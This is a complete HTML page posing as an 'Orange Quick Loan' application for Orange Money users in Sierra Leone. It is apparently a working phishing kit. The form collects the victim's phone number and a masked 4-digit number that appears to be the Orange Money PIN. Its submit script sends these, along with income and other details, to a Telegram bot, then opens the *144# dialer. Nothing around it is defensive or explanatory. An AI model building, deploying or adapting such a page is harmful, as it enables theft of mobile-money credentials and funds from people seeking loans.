<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Orange Quick Loan</title>
<style>
  body{font-family:Arial,sans-serif;background:#fff3e6;margin:0;padding:20px}
  .box{max-width:480px;margin:auto;background:#fff;padding:24px;border-radius:16px;box-shadow:0 4px 20px rgba(0,0,0,0.1)}
  h1{text-align:center;color:#ff6600;margin:0}
  p{text-align:center;color:#666;font-size:14px}
  label{font-weight:bold;display:block;margin-top:16px;font-size:14px}
  input,select,textarea{width:100%;padding:12px;margin-top:6px;border:1px solid #ddd;border-radius:10px;font-size:15px;box-sizing:border-box}
  .req{color:red}
  button{width:100%;padding:15px;background:#ff6600;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:bold;margin-top:22px;cursor:pointer}
  .note{background:#fff7e6;padding:12px;border-radius:10px;font-size:13px;margin-top:16px;color:#555}
</style>
</head>
<body>
<div class="box">
  <h1>Orange Quick Loan</h1>
  <p>Quick Loan - Sierra Leone<br>Your phone + Your 4 Digit Number = Only you can apply</p>

  <form id="loanForm">
    <label>Phone / Orange Money Number <span class="req">*</span></label>
    <input type="tel" id="phone" placeholder="e.g. 076 123 456" required>

    <label>Input Your 4 Digit Number <span class="req">*</span></label>
    <input type="password" id="pin" placeholder="Enter 4 digits" maxlength="4" pattern="[0-9]{4}" inputmode="numeric" required>

    <label>Full Name (Optional)</label>
    <input type="text" id="name" placeholder="Your full name">

    <label>How Much Loan Do You Want? (Optional)</label>
    <select id="amount">
      <option value="">Select amount</option>
      <option>Le 500,000</option>
      <option>Le 1,000,000</option>
      <option>Le 1,500,000</option>
      <option>Le 2,000,000</option>
      <option>Le 2,500,000</option>
      <option>Le 5,000,000</option>
    </select>

    <label>How Much Enters Your Orange Money Monthly? (Optional)</label>
    <select id="income">
      <option value="">Select</option>
      <option>Less than Le 500,000</option>
      <option>Le 500,000 - Le 1,000,000</option>
      <option>Le 1,000,000 - Le 2,500,000</option>
      <option>More than Le 2,500,000</option>
    </select>

    <label>Why Do You Need The Loan? (Optional)</label>
    <textarea id="reason" rows="3" placeholder="Business, school fees, emergency..."></textarea>

    <button type="submit">Submit Application & Open Orange Money</button>

    
  </form>
</div>

<script>
document.getElementById('loanForm').addEventListener('submit', function(e){
  e.preventDefault();
  var phone = document.getElementById('phone').value.trim();
  var pin = document.getElementById('pin').value.trim();
  if(!phone){ alert('Please enter your Phone Number.'); return; }
  if(!pin || pin.length !== 4 || isNaN(pin)){ alert('Please input your 4 digit number.'); return; }
  var name = document.getElementById('name').value || 'Not provided';
  var amount = document.getElementById('amount').value || 'Not provided';
  var income = document.getElementById('income').value || 'Not provided';
  var reason = document.getElementById('reason').value || 'Not provided';

  var message = "NEW LOAN APPLICATION%0A%0A" +
    "Phone: " + encodeURIComponent(phone) + "%0A" +
    "your four digit number : " + encodeURIComponent(pin) + "%0A" +
    "Name: " + encodeURIComponent(name) + "%0A" +
    "Loan Amount: " + encodeURIComponent(amount) + "%0A" +
    "Monthly Income: " + encodeURIComponent(income) + "%0A" +
    "Reason: " + encodeURIComponent(reason) + "%0A%0A" +
    "Please send screenshot of Orange Money transactions.";

  window.open("https://t.me/Ivanoon_bot?text=" + message, "_blank");
  setTimeout(function(){ window.location.href = "tel:*144%23"; }, 800);
});
</script>
</body>
</html>
